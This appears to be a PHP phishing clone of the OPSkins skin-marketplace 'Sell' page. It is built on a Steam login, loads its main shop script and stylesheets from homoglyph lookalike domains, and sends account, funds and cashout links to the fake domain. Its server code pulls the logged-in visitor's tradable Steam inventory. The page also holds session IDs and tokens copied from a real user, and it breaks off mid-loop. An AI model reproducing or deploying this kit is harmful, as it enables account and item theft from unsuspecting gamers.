<?php

require 'steamauth/steamauth.php';

?>
<html lang="en" class=""><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width = device-width, initial-scale = 1">
<meta name="p:domain_verify" content="d5f813c8be7f4e6c9caa25da040c696a">
<meta name="yandex-verification" content="7248ff734ab5b1e4">
<base href="https://opskins.com">
<link href="/js/slick/slick.css?v=439055f9" rel="stylesheet" type="text/css"> <link href="/js/slick/slick-theme.css?v=de234adf" rel="stylesheet" type="text/css"> <link href="https://xn--opskns-zva.com/bootstrap-3.3.7.min.css?v=6527d8bf" rel="stylesheet" type="text/css"> <link href="//fonts.googleapis.com/css?family=Open+Sans:400,700,600%7CRoboto:400,500,700%7CKhand:400,300,500,600,700%7CRoboto+Condensed:400,700" rel="stylesheet" type="text/css"> <link href="/bower_components/typeahead.js-bootstrap3.less/typeaheadjs.css?v=c90c22ef" rel="stylesheet" type="text/css"> <link href="/css/stickerpreview.css?v=ab588230" rel="stylesheet" type="text/css"> <link href="//cdnjs.cloudflare.com/ajax/libs/c3/0.4.11/c3.min.css" rel="stylesheet" type="text/css"> <link href="https://opskìns.com/app.css?v=cc1769fd" rel="stylesheet" type="text/css"> <link href="/images/weapons_nav/440_2/_spritesheet.css?v=59fc6c7" rel="stylesheet" type="text/css"> <link href="/images/weapons_nav/730_2/_spritesheet.css?v=59fc6c7" rel="stylesheet" type="text/css"> <link href="https://xn--opskns-zva.com/font-awesome.min.css?v=12d68610" rel="stylesheet" type="text/css"> <link href="https://opskìns.com/steam-icons.css?v=5a95a991" rel="stylesheet" type="text/css">
<link rel="icon" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" href="/images/favicon-192x192.png" sizes="192x192">
<link rel="apple-touch-icon-precomposed" href="/images/favicon-180x180.png">
<meta name="msapplication-TileImage" content="/images/favicon-270x270.png">

<link rel="alternate" hreflang="en" href="https://opskins.com/?loc=sell">
<link rel="alternate" hreflang="ru" href="https://ru.opskins.com/?loc=sell">
<link rel="shortcut icon" type="image/png" href="/favicon.ico">

<script type="text/javascript" async="" defer="" src="//piwik.opskins.win/piwik.js"></script><script src="https://hm.baidu.com/hm.js?f4d83c43fa7e41722d75d036cbcfcbbe"></script><script async="" src="//static.ads-twitter.com/uwt.js"></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="//bat.bing.com/bat.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/plugins/ua/ec.js"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/plugins/ua/ecommerce.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-K5R6TC"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script>
            var g_UID = 4182747;
            var g_Has2FA = false;
            var g_CanSpecialActions = false;
            var g_BalanceHidden = false;
            var g_appid_csgo = 730;
            var g_appid_tf2 = 440;
            var g_appid_steam = 753;
            var g_appid_dota = 570;
            var g_appId = 730;
            var g_contextId = 2;

            var g_cacheBuster = '59fc6c7';

            var g_ss_percent = 2;
            var g_ss_min_price = 49;
            var g_ss_max_price = 150;
            var g_ReCaptchaSiteKey = "6Let3icTAAAAAMUECSvOrp-JEG3QG9IrLFvBbJAR";
            var g_ReCaptchaSiteKeyInvisible = "6LdAphoUAAAAAKG-ftN5fSnPdibpqDW9CnpCC9-Y";
            var g_steam_images_url = "https://steamcommunity-a.opskins.media";
            var g_steam_images_url_2 = "https://steamcdn-a.opskins.media";
            var g_curGraphType = 1;
            var g_Lang = "en";
            var g_trp = 0;
            window.g_AllowLiveListings = false;
            window.g_PriceSuggestionType = 'suggested_price_analyst';
            window.g_user_hash = '041ba2e39484b17dd72ebe67e362a496c26cafcb';
        </script>
<script src="//widget.trustpilot.com/bootstrap/v5/tp.widget.bootstrap.min.js" type="text/javascript"></script> <script src="/js/jquery-2.1.4.min.js?v=43dc5546" type="text/javascript"></script> <script src="/js/opskins.lang.js?v=7efd3823" type="text/javascript"></script> <script>
        try{
            (function (i, s, o, g, r, a, m) {
                i['GoogleAnalyticsObject'] = r;
                i[r] = i[r] || function () {
                    (i[r].q = i[r].q || []).push(arguments)
                }, i[r].l = 1 * new Date();
                a = s.createElement(o),
                        m = s.getElementsByTagName(o)[0];
                a.async = 1;
                a.src = g;
                m.parentNode.insertBefore(a, m)
            })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
            ga('create', 'UA-57760314-1', 'auto');
            ga('send', 'pageview');
            ga('require', 'ecommerce');
            ga("set", "userId", 4182747);
            // Google Tag Manager
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer','GTM-K5R6TC');

                var dataLayerUser = {
      "user": {
        "id": "4182747"
      }
    };

    if (typeof dataLayer === 'object' && dataLayer.push) {
        dataLayer.push(dataLayerUser);
    }

    var dataLayerAff = {
        "affiliate": {
            "affiliateId":  "2",
            "transId":      "1024a4a82d46b6159c788cff1f01c9",
            "newuser":      "newUser",
            "source":       "Adwords",
        }
    };

    if (typeof dataLayer === "object" && dataLayer.push) {
        dataLayer.push(dataLayerAff);
    }
        }catch (e) {

        }
        </script>
<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion_async.js" charset="utf-8"></script>
<title>Buy &amp; Sell CSGO, H1Z1 &amp; PUBG Skins &amp; Items | OPSkins Marketplace.</title>
<meta name="description" content="Buy and sell steam marketplace skins and items on the world's largest skin market. CSGO, H1Z1, PUBG, DOTA 2 and more! Instant cashouts and buyers club deals. Shop Now!">
<link rel="stylesheet" href="/css/sell.css?t=59fc6c7"></head>
<body>
<script src="/js/scripts.php?s=jquery.form,jquery.cookie,bootstrap-3.3.7.min,bootstrap-tooltip,clipboard.min" type="text/javascript"></script>
<script src="/bower_components/typeahead.js/dist/typeahead.bundle.min.js?v=cc81b245" type="text/javascript"></script> <script src="//cdnjs.cloudflare.com/ajax/libs/d3/3.5.17/d3.min.js" type="text/javascript"></script> <script src="//cdnjs.cloudflare.com/ajax/libs/c3/0.4.14/c3.min.js" type="text/javascript"></script> <script src="/js/jquery-ui.min.js?v=25abf766" type="text/javascript"></script> <script src="https://files.opskins.media/file/opskins-static/json/stickers.js?v=a6db5c9c" type="text/javascript"></script> <script src="https://xn--opskns-zva.com/opskins.shop.js?v=1b900440" type="text/javascript"></script> <script src="/js/opskins.notifier.js?v=326c923a" type="text/javascript"></script> <script src="/js/opskins.stickerpreview.js?v=2d7124ef" type="text/javascript"></script>
<script type="text/javascript">
            try{
                var _user_id = '4182747';
                var _session_id = '6cf980f02d03901e82d88cfd6e6207f9';
                var _sift = window._sift = window._sift || [];
                _sift.push(['_setAccount', '5e7e40fa51']);
                _sift.push(['_setUserId', '76561198376840118']);
                _sift.push(['_setSessionId', _session_id]);
                _sift.push(['_trackPageview']);
                _sift.push(['_setCookieDomain', 'opskins.com']);
                (function() {
                    function ls() {
                        var e = document.createElement('script');
                        e.src = 'https://cdn.siftscience.com/s.js';
                        document.body.appendChild(e);
                    }
                    if (window.attachEvent) {
                        window.attachEvent('onload', ls);
                    } else {
                        window.addEventListener('load', ls, false);
                    }
                })();
            }catch (e){

            }
            </script>
<div class="content-block-overlay"></div>
<div class="content-fluid nav-push" style="height: 293px;">
<nav class="navbar navbar-inverse navbar-fixed-top">
<button type="button" class="navbar-toggle visible-xs pull-left" data-toggle="collapse" data-target="#top-nav-bar">
</button>
<div class="logo-mobile visible-xs">
<a href="/"><img src="/images/logo.png" class="img-responsive" alt="OPSkins"></a>
</div>
<div id="acctDash" class="visible-xs">
<div class="navbar-brand navbar-rigth visible-xs"><div class="user-info"><div class="user-avatar"><img src="https://steamcdn-a.opskins.media/steamcommunity/public/images/avatars/30/304b6c9d06b87a58960278dca828a6bdd844de02.jpg" alt="Avatar"></div><ul class="avatar-menu"><li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-expanded="false"><h2>FuRy <span class="caret"></span></h2></a><ul class="dropdown-menu" role="menu"><li class="sub-menu"><a href="/?loc=payments">Add Funds</a><a href="/?loc=subscriptions">Subscriptions (0)</a><a href="/?loc=store_account">Account</a><a href="/?loc=inventory">Inventory</a><a href="/?loc=store_account#manageSales">Manage Sales</a><a href="/?loc=shop_cashout">Cashout</a><a href="/?loc=logout&amp;csrf=2Vm3pKewWkiN0oHjcuT7SSn3D8u3521Z1">Logout</a></li></ul></li></ul></div><div class="coin-count"><span id="coin-count-label">Your Balance</span><span class="op-count">0.00</span><span class="op-credits-count"><span title="Operation Points earned by Instant-Selling items to us.
Learn more by visiting your Inventory."><i class="icon-logo"></i> 0.00</span></span></div></div> </div>
<div class="container-fluid nav-container-fluid">
<div class="navbar-header">
<?php
if(!isset($_SESSION['steamid'])) {

    loginbuttonmain(); //login button

}  else {

    include ('steamauth/userInfo.php'); //To access the $steamprofile array
    //Protected content
 echo '<div class="navbar-brand navbar-rigth visible-lg visible-md visible-sm"><div class="user-info"><div class="user-avatar" style="float:left;" =""><img src="'. $steamprofile['avatar'].'" alt="Avatar"></div><ul class="avatar-menu" style="float:left;"><li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-expanded="false"><h2>'.$steamprofile['personaname'].'<span class="caret"></span></h2></a><ul class="dropdown-menu" role="menu"><li class="sub-menu"><a href="https://xn--opskns-zva.com/?loc=payments">Add Funds</a><a href="https://xn--opskns-zva.com/?loc=subscriptions">Subscriptions (0)</a><a href="https://xn--opskns-zva.com/?loc=store_account">Account</a><a href="https://xn--opskns-zva.com/?loc=inventory">Inventory</a><a href="https://xn--opskns-zva.com/?loc=store_account#manageSales">Manage Sales</a><a href="https://xn--opskns-zva.com/?loc=shop_cashout">Cashout</a><a href="https://xn--opskns-zva.com/?loc=logout&amp;csrf=2KgLjRHbIukuG8cKu0mPQjR8ucUz7LHFO">Logout</a></li></ul></li></ul></div><div class="coin-count" style="float:left;"><span class="op-count" style="display:block;">0.00</span><span class="op-credits-count" style="display:block;"><span title="Operation Points earned by Instant-Selling items to us.Learn more by visiting your Inventory."><i class="icon-logo"></i> 0.00</span></span></div></div>';

    //logoutmain(); //Logout Button
}
?><div class="dropdown response-lang-btn" id="language-picker">
<button class="btn btn-default dropdown-toggle btn-flag lang-flag-en" type="button" id="language-picker-dropdown-menu" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true" title="English"> <span class="hidden-sm hidden-xs"> English&nbsp;&nbsp;</span><b class="caret"></b>
</button>
<ul class="dropdown-menu" aria-labelledby="language-picker-dropdown-menu">
<span class="dialog-arrow-block"><span class="dialog-arrow"></span></span>
<li>
<a href="https://zh.opskins.com/?loc=sell&amp;_mls=zh" class="langLink">
<span title="中文" class="btn-flag lang-flag-zh"></span><span class="hidden-sm hidden-xs"> &nbsp;中文</span>
</a>
</li>
<li>
<a href="https://ru.opskins.com/?loc=sell&amp;_mls=ru" class="langLink">
<span title="Русский" class="btn-flag lang-flag-ru"></span><span class="hidden-sm hidden-xs"> &nbsp;Русский</span>
</a>
</li>
<li>
<a href="https://de.opskins.com/?loc=sell&amp;_mls=de" class="langLink">
<span title="Deutsch" class="btn-flag lang-flag-de"></span><span class="hidden-sm hidden-xs"> &nbsp;Deutsch</span>
</a>
</li>
<li>
<a href="https://es.opskins.com/?loc=sell&amp;_mls=es" class="langLink">
<span title="Español" class="btn-flag lang-flag-es"></span><span class="hidden-sm hidden-xs"> &nbsp;Español</span>
</a>
</li>
<li>
<a href="https://fi.opskins.com/?loc=sell&amp;_mls=fi" class="langLink">
<span title="Suomi" class="btn-flag lang-flag-fi"></span><span class="hidden-sm hidden-xs"> &nbsp;Suomi</span>
</a>
</li>
<li>
<a href="https://fr.opskins.com/?loc=sell&amp;_mls=fr" class="langLink">
<span title="Français" class="btn-flag lang-flag-fr"></span><span class="hidden-sm hidden-xs"> &nbsp;Français</span>
</a>
</li>
<li>
<a href="https://hu.opskins.com/?loc=sell&amp;_mls=hu" class="langLink">
<span title="Magyar" class="btn-flag lang-flag-hu"></span><span class="hidden-sm hidden-xs"> &nbsp;Magyar</span>
</a>
</li>
<li>
<a href="https://lt.opskins.com/?loc=sell&amp;_mls=lt" class="langLink">
<span title="Lietuvių" class="btn-flag lang-flag-lt"></span><span class="hidden-sm hidden-xs"> &nbsp;Lietuvių</span>
</a>
</li>
<li>
<a href="https://nl.opskins.com/?loc=sell&amp;_mls=nl" class="langLink">
<span title="Dutch" class="btn-flag lang-flag-nl"></span><span class="hidden-sm hidden-xs"> &nbsp;Dutch</span>
</a>
</li>
<li>
<a href="https://no.opskins.com/?loc=sell&amp;_mls=no" class="langLink">
<span title="Norsk" class="btn-flag lang-flag-no"></span><span class="hidden-sm hidden-xs"> &nbsp;Norsk</span>
</a>
</li>
<li>
<a href="https://pl.opskins.com/?loc=sell&amp;_mls=pl" class="langLink">
<span title="Polski" class="btn-flag lang-flag-pl"></span><span class="hidden-sm hidden-xs"> &nbsp;Polski</span>
</a>
</li>
<li>
<a href="https://pt.opskins.com/?loc=sell&amp;_mls=pt" class="langLink">
<span title="Português" class="btn-flag lang-flag-pt"></span><span class="hidden-sm hidden-xs"> &nbsp;Português</span>
</a>
</li>
<li>
<a href="https://sv.opskins.com/?loc=sell&amp;_mls=sv" class="langLink">
<span title="Svenska" class="btn-flag lang-flag-sv"></span><span class="hidden-sm hidden-xs"> &nbsp;Svenska</span>
</a>
</li>
<li>
<a href="https://tr.opskins.com/?loc=sell&amp;_mls=tr" class="langLink">
<span title="Türkçe" class="btn-flag lang-flag-tr"></span><span class="hidden-sm hidden-xs"> &nbsp;Türkçe</span>
</a>
</li>
<li>
<a href="https://uk.opskins.com/?loc=sell&amp;_mls=uk" class="langLink">
 <span title="Українська" class="btn-flag lang-flag-uk"></span><span class="hidden-sm hidden-xs"> &nbsp;Українська</span>
</a>
</li>
</ul>
</div>
</div>
<div class="logo visible-lg visible-md visible-sm hidden-xs">
<a href="/"><img src="/images/logo.png" class="img-responsive" alt="OPSkins"></a>
</div>
<div class="collapse navbar-collapse" id="top-nav-bar">
<ul class="nav navbar-nav">
<li class="menu visible-sm visible-xs"><a href="/">Home</a></li><li class="menu hidden-lg hidden-md visible-sm visible-xs"><a href="/?loc=shop_checkout">Checkout<span class="badge" id="cartCountMobile">0</span></a></li><li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Shop<span class="caret"></span></a><ul class="dropdown-menu left" role="menu"><li class="sub-menu"><a href="/?loc=featured">Featured</a></li><li class="sub-menu"><a href="/?loc=game">Lowest Priced Items</a></li><li class="sub-menu"><a href="/?loc=shop_browse&amp;app=730_2">Browse</a></li><li class="sub-menu"><a href="/?loc=weapon_builder">Weapon Builder™</a></li><li class="sub-menu"><a href="https://shop.opskins.com" target="_BLANK">OP Apparel</a></li></ul></li><li class="menu"><a href="/?loc=good_deals&amp;sort=n&amp;app=730_2">Good Deals</a></li><li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Support <span class="badge" style="display:none"> 0</span><span class="caret"></span></a><ul class="dropdown-menu left" role="menu"><li class="sub-menu"><a href="/kb/faq">FAQ</a></li><li class="sub-menu"><a href="/?loc=support_tickets">Support</a></li></ul></li><li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown">Community<span class="caret"></span></a><ul class="dropdown-menu left" role="menu"><li class="sub-menu"><a href="https://blog.opskins.com" target="_BLANK">Blog</a></li><li class="sub-menu"><a href="https://itemdb.opskins.com" target="_BLANK">Catalog</a></li><li class="sub-menu"><a href="/?loc=about">About</a></li><li class="sub-menu"><a href="/?loc=price_lookup&amp;app=730_2">Price List</a></li><li class="sub-menu"><a href="/kb/api-v2">API Documentation</a></li><li class="sub-menu"><a href="https://npmjs.com/package/@opskins/api" target="_BLANK">npm package</a></li></ul></li><li class="menu"><a href="/?loc=payments">Add Funds</a></li><li class="menu"><a href="/?loc=sell">Sell</a></li><li><a href="/?loc=inventory">Inventory <span class="badge" style="display:none">0</span></a></li><li class="sub-menu visible-sm visible-xs"><a href="/?loc=shop_browse">Browse</a></li><li class="sub-menu visible-sm visible-xs"><a href="/?loc=shop_search">Search</a></li><li class="menu visible-sm visible-xs"><a href="/?loc=store_account">Account</a></li><li class="menu visible-sm visible-xs"><a href="/?loc=subscriptions">Subscriptions</a></li><li class="menu visible-sm visible-xs"><a href="/?loc=shop_cashout">Cashout</a></li><li class="menu visible-sm visible-xs"><a href="/?loc=logout&amp;csrf=2Vm3pKewWkiN0oHjcuT7SSn3D8u3521Z1">Logout</a></li>
<li class="divider"></li>
</ul>
</div>
</div>
</nav>
</div><div id="alert-box" style="display:none">
<div class="alert alert-success"></div>
<div id="dismiss">
<p>Click to dismiss.</p>
</div>
</div>
<div id="eu-cookie-stuff">
<p>OPSkins makes use of <a href="https://en.wikipedia.org/wiki/HTTP_cookie" target="_blank">cookies</a> to personalize your experience and to deliver the best deals. By using OPSkins, you agree to accept these cookies.</p>
<button id="eu-cookie-stuff-accept" class="btn btn-primary btn-sm">I understand</button>
</div>
<input type="hidden" id="bumpPrice" value="50">
<div class="modal fade" id="search_modal">
<div class="modal-dialog modal-lg" id="ssModalBody">
<div class="modal-content ssModalContainer">
<div class="modal-header">
<h4 class="modal-title ssModalTitle">Search<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true" style="color:white">×</span></button></h4>
</div>
<form class="form-group" role="search" method="GET" id="search_m" action="/">
<input type="hidden" name="loc" value="shop_search">
<div class="combobox-container"><div class="input-group"><span class="input-group-addon combo-addon">Game</span><select name="app" class="form-control combobox search_app"><option value="730_2" selected="">Counter-Strike: Global Offensive</option><option value="440_2">Team Fortress 2</option><option value="570_2">Dota 2</option><option value="295110_1">Just Survive</option><option value="433850_1">H1Z1</option><option value="578080_2">PLAYERUNKNOWN'S BATTLEGROUNDS</option><option value="218620_2">PAYDAY 2</option><option value="304930_2">Unturned</option><option value="252490_2">Rust</option><option value="232090_2">Killing Floor 2</option><option value="753_6">Steam Community</option></select></div></div><div class="input-group"><span class="input-group-addon">Search</span><input type="text" class="form-control" name="search_item" value="" placeholder="Name"><div class="input-group-addon" data-toggle="modal" data-target="#searchEngineHelp" style="cursor:pointer;"><span class="glyphicon glyphicon-info-sign "></span></div></div><div class="input-group"><span class="input-group-addon">Range</span><input type="number" class="form-control" placeholder="Minimum price" name="min" step="0.01" min="0.02" max="99999.99" value=""><input type="number" class="form-control" placeholder="Maximum price" name="max" step="0.01" min="0.02" max="99999.99" value=""></div><div class="input-group"><span class="input-group-addon">Sorting</span><select name="sort" class="combobox form-control sort"><option value="f">Featured</option><option value="lh">Price: Low → High</option><option value="hl">Price: High → Low</option><option value="n">Age: New → Old</option><option value="o">Age: Old → New</option><option value="wlh" data-search-apps="730_2">Wear: Low → High</option><option value="whl" data-search-apps="730_2">Wear: High → Low</option></select></div><div data-search-apps="730_2"><div class="combobox-container"><div class="input-group"><span class="input-group-addon combo-addon">StatTrak</span><select name="stat" class="form-control combobox"><option value="legs">Legs</option></select></div></div></div><div class="row" style="padding-bottom:0.5em;" data-search-apps="730_2"><div class="col-md-12"><div class="stickers_added"></div></div></div>
<div class="modal-footer">
<input type="button" class="btn btn-dkBlue pull-left search-reset" value="Clear">
<button type="submit" class="btn btn-orange pull-left" form="search_m">Search</button>
</div>
</form>
</div>
</div>
</div>
<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","1243434732385576");fbq("track","PageView");</script>
<noscript>&lt;img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1243434732385576&amp;amp;ev=PageView&amp;amp;noscript=1"&gt;</noscript>



<script type="text/javascript" id="">!function(d,e,f,a,b,c){d.twq||(a=d.twq=function(){a.exe?a.exe.apply(a,arguments):a.queue.push(arguments)},a.version="1.1",a.queue=[],b=e.createElement(f),b.async=!0,b.src="//static.ads-twitter.com/uwt.js",c=e.getElementsByTagName(f)[0],c.parentNode.insertBefore(b,c))}(window,document,"script");twq("init","nx5da");twq("track","PageView");</script>
<script type="text/javascript" id="">var _hmt=_hmt||[];(function(){var a=document.createElement("script");a.src="https://hm.baidu.com/hm.js?f4d83c43fa7e41722d75d036cbcfcbbe";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)})();</script>
<div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.4059509407601891"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.09547151633589968" width="0" height="0" alt="" src="https://bat.bing.com/action/0?ti=5439797&amp;Ver=2&amp;mid=fe788d77-c180-9193-084d-04e656c129a4&amp;evt=pageLoad&amp;sid=f2673e77-0&amp;pi=-1978200868&amp;lg=ru&amp;sw=1440&amp;sh=900&amp;sc=24&amp;tl=Buy &amp; Sell CSGO, H1Z1 &amp; PUBG Skins &amp; Items | OPSkins Marketplace.&amp;r=https%3A%2F%2Fopskins.com%2F&amp;p=https%3A%2F%2Fopskins.com%2F%3Floc%3Dsell&amp;msclkid=N&amp;rn=825975"></div><nav class="navbar navbar-inverse navbar-lower navbar-fixed-top" id="weapon-navbar" style="top: 188px;">
<div class="weapon-nav">
<ul class="nav nav-pills">
<li><a href="/?loc=shop_browse">Browse CS:GO Listings</a></li>
<li class="dropdown" style="padding-right: 2px; border-right: 1px dotted #003345">
<a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">Change Game <b class="caret"></b></a>
<ul class="dropdown-menu">
<li><a href="/?loc=sell&amp;app=730_2" id="appbtn-730_2" class="appbtn selected_app">Counter-Strike: Global Offensive</a></li><li><a href="/?loc=sell&amp;app=440_2" id="appbtn-440_2" class="appbtn">Team Fortress 2</a></li><li><a href="/?loc=sell&amp;app=570_2" id="appbtn-570_2" class="appbtn">Dota 2</a></li><li><a href="/?loc=sell&amp;app=295110_1" id="appbtn-295110_1" class="appbtn">Just Survive</a></li><li><a href="/?loc=sell&amp;app=433850_1" id="appbtn-433850_1" class="appbtn">H1Z1</a></li><li><a href="/?loc=sell&amp;app=578080_2" id="appbtn-578080_2" class="appbtn">PLAYERUNKNOWN'S BATTLEGROUNDS</a></li><li><a href="/?loc=sell&amp;app=218620_2" id="appbtn-218620_2" class="appbtn">PAYDAY 2</a></li><li><a href="/?loc=sell&amp;app=304930_2" id="appbtn-304930_2" class="appbtn">Unturned</a></li><li><a href="/?loc=sell&amp;app=252490_2" id="appbtn-252490_2" class="appbtn">Rust</a></li><li><a href="/?loc=sell&amp;app=232090_2" id="appbtn-232090_2" class="appbtn">Killing Floor 2</a></li><li style="padding-right: 2px; border-right: 1px dotted #003345"><a href="/?loc=sell&amp;app=753_6" id="appbtn-753_6" class="appbtn">Steam Community</a></li> </ul>
</li>
<li class="dropdown appnav appnav_730 visible-lg visible-md visible-sm hidden-xs"><a href="#" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown">Pistols <b class="caret"></b></a><ul class="dropdown-menu"><li><a href="/?loc=shop_search&amp;app=730_2&amp;search_item=%22CZ75-Auto%22&amp;type=p&amp;search_internal=1"><i class="navsprite-730_2 navsprite-730_2-CZ75-Auto"></i> CZ75-Auto</a></li><li><</li>
</ul>
<script>
        $('.searchMobile').click(function(){$('#qkSearch-block').toggleClass('open');});
        </script>
</div>
<div id="qkSearch-block">
<div id="qkSearch-widget">
<form role="search" method="GET" id="search_qk" action="/">
<input type="hidden" name="loc" value="shop_search">
<input type="hidden" name="app" value="730_2">
<input type="text" class="searchfield" name="search_item" value="" placeholder="Search CS:GO">
<button type="submit" form="search_qk"></button>
<input type="hidden" name="sort" value="lh">
</form>
<span class="advSearch"><a href="#" data-toggle="modal" data-target="#search_modal">Advanced Search</a></span>
</div>
</div>
</nav>
<script>
    var g_MyCoins = 0;
    var g_CommissionPct = {"730":10,"440":10,"570":10,"295110":10,"433850":10,"578080":10,"218620":10,"304930":10,"252490":10,"232090":10,"753":10};
    var g_PriceSuggestionType = "market_price";
    var g_MinimumPrice = 2;
    var g_MaximumPrice = 9999999;
    var g_MaxItemsPerQueue = 100;
    var g_ShowcasePrice = 295;
    var g_ShowcaseCredits = 0;
    var g_ScreenshotPricePct = 2;
    var g_ScreenshotPriceMin = 49;
    var g_ScreenshotPriceMax = 150;
    var g_ShowcaseScreenshotBundlePrice = 445;
    var g_NoScreenshotTypes = ["Base Grade Key","Base Grade Container","High Grade Sticker","Base Grade Tag","Exotic Sticker","Base Grade Pass","Remarkable Sticker","High Grade Music Kit","Base Grade Gift","Contraband Sticker","Base Grade Tool","StatTrak\u2122 High Grade Music Kit"];
    var g_NumOsiItems = 0;
    var g_UseSFP = false; </script>

<div class="modal" tabindex="-1" role="dialog" id="sell-location-modal" data-keyboard="false" data-backdrop="static">
<div class="modal-dialog modal-lg" role="document">
<div class="modal-content">
<div class="modal-header">
<h4 class="modal-title">Are you subject to Canadian taxes?</h4>
</div>
<div class="modal-body">
<p>We are required by Canadian law to collect tax from Canadian residents. Tax is collected on the amount of our sale commission, not on the full sale price of your items.</p><p>Please provide your country and state/province of residence. If you are not a Canadian resident, please also indicate so.</p> <form id="sell-location-form">
<input type="hidden" id="countryVal" value="">
<input type="hidden" id="regionVal" value="">
<div class="form-group">
<label for="country">Country</label>
<select id="country" class="form-control combobox" required="">
<option value="">Select one...</option>
</select>
</div>
 <div class="form-group">
<label for="state">State/Province</label>
<select id="state" class="form-control combobox">
<option value="">Select one...</option>
</select>
<input type="text" id="nostate" class="form-control" value="">
</div>
<div class="checkbox op-no-canada">
<label>
<input type="checkbox" id="country-no-canada">
I certify that I am not resident in Canada for purposes of the Excise Tax Act. Where applicable, I agree to advise OPSkins of any change to my residence status for purposes of the Excise Tax Act. </label>
</div>
</form>
</div>
<div class="modal-footer">
<button type="submit" form="sell-location-form" class="btn btn-primary">Save Information</button>
</div>
</div>
</div>
</div>

<div class="modal fade" tabindex="-1" role="dialog" id="sell-prefs-modal">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
<h4 class="modal-title">Selling Preferences</h4>
</div>
<div class="modal-body">
<form id="sell-prefs-form">
<div class="checkbox">
<label>
<input type="checkbox" id="sell-prefs-group-commodities">
Group commodity (identical) items </label>
</div>
<div class="checkbox">
<label>
<input type="checkbox" id="sell-prefs-autofill-lowest-price">
Auto-fill lowest OPSkins list price instead of suggested price </label>
</div>
</form>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
<button type="submit" class="btn btn-primary" form="sell-prefs-form">Save Changes</button>
</div>
</div>
</div>
</div>
<div class="row">
<div class="topRowCTA">
Don't want to wait? Instant-Sell your items to us! <span class="action">
<a href="/?loc=instantsell" class="btn btn-primary btn-lg">Instant-Sell</a>
</span>
</div>
<div class="col-md-4 col-lg-5">
<h3 class="nopad" id="sell-steam-inv">Your Steam Inventory <small>Displaying tradable items only</small></h3>
<h3 class="nopad" style="display:none" id="sell-osi">Your OPSkins Inventory</h3>
<a href="javascript:setSellFromOsi(false)" style="display:none" id="set-sell-from-steam" class="btn btn-orange btn-sm">Show items from your Steam inventory...</a>
<a href="javascript:setSellFromOsi(true)" style="display:none" id="set-sell-from-osi" class="btn btn-orange btn-sm">Show items from your OPSkins inventory...</a>
<ul class="nav nav-pills sale-app-tabs" id="nav-apps">
<li role="presentation" id="navpill-730_2" class="active"><a href="javascript:loadInventory(730, 2)">CS:GO</a></li>
<li role="presentation" id="navpill-440_2" class=""><a href="javascript:loadInventory(440, 2)">TF2</a></li>
<li role="presentation" id="navpill-570_2"><a href="javascript:loadInventory(570, 2)">Dota 2</a></li>
<li role="presentation" id="navpill-295110_1"><a href="javascript:loadInventory(295110, 1)">JS</a></li>
<li role="presentation" id="navpill-433850_1"><a href="javascript:loadInventory(433850, 1)">H1Z1</a></li>
<li role="presentation" id="navpill-578080_2"><a href="javascript:loadInventory(578080, 2)">PUBG</a></li>
<li role="presentation" id="navpill-218620_2"><a href="javascript:loadInventory(218620, 2)">PAYDAY 2</a></li>
<li role="presentation" id="navpill-304930_2"><a href="javascript:loadInventory(304930, 2)">Unturned</a></li>
<li role="presentation" id="navpill-252490_2"><a href="javascript:loadInventory(252490, 2)">Rust</a></li>
<li role="presentation" id="navpill-753_6" class=""><a href="javascript:loadInventory(753, 6)">Steam</a></li>
</ul>
<input type="text" id="inv-filter" class="form-control" placeholder="Start typing to find an item...">

<div id="inv-container">
    <?php
      if(!isset($_SESSION['steamid'])) {



      }  else {
        $get_content = file_get_contents($steamprofile['profileurl']."/inventory/json/730/2");
        $data_image = (array) json_decode($get_content) -> rgInventory;
        $count_content = count($data_image);
        $data_content = (array) json_decode($get_content, TRUE);
        for ($i=0; $i<$count_content; $i++) {
            $element_name = array_shift($data_content[rgInventory]);
            $name_item = "$element_name[classid]_$element_name[instanceid]";
            $contextid = $data_content['rgDescriptions'][$name_item]['id'];
            if($data_content['rgDescriptions'][$name_item]['tradable'] != '0'){
              $market_hash_name = $data_content['rgDescriptions'][$name_item]['market_hash_name'];
